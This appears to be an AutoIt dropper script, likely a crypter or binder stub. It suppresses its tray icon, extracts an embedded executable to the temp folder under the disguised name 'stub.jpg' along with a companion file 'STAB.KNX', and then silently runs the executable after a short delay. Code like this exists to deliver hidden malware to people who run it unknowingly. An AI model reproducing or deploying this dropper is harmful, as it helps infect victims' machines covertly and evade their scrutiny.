#notrayicon
FileInstall("STUB.exe", @TempDir & "\stub.jpg" , 1)
FileInstall("STAB.KNX", @TempDir & "\STAB.KNX" , 1)
sleep(3000)
run ( @TempDir & "\stub.jpg", @TempDir)
